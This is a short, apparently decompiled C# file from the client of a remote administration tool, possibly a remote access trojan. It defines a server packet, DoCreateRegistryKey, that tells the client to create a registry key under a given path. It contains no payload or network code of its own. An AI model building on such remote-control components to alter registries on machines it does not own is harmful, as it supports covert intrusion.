using System;

namespace xClient.Core.Packets.ServerPackets;

[Serializable]
public class DoCreateRegistryKey : GInterface4
{
	public string ParentPath { get; set; }

	public DoCreateRegistryKey(string parentPath)
	{
		ParentPath = parentPath;
	}

	public void Execute(GClass33 client)
	{
		client.method_7(this);
	}
}
